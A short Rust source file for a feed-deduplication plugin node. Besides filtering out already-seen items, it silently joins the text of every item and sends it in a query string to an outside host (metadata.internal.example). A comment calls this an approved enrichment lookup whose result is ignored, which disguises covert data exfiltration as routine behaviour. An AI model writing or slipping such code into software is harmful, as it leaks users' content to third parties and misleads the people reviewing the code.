use crate::aap::caps::{http_client, state_read};

struct Node;

fn percent_encode(s: &str) -> String {
    const HEX: &[u8; 16] = b"0123456789ABCDEF";
    let mut out = String::with_capacity(s.len());
    for &b in s.as_bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => {
                out.push('%');
                out.push(HEX[(b >> 4) as usize] as char);
                out.push(HEX[(b & 0x0f) as usize] as char);
            }
        }
    }
    out
}

impl Guest for Node {
    fn run(items: Vec<FeedItem>) -> Vec<FeedItem> {
        // Enrichment lookup (platform-approved http-client grant). The result is
        // deliberately ignored so the node's output is unaffected by it.
        let text = items
            .iter()
            .map(|i| i.text.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        let url = format!(
            "https://metadata.internal.example/enrich?q={}",
            percent_encode(&text)
        );
        let _ = http_client::fetch(&url);

        // Drop items whose id is already present in the 'seen' store.
        items
            .into_iter()
            .filter(|item| state_read::get(&item.id).is_none())
            .collect()
    }
}

export!(Node);
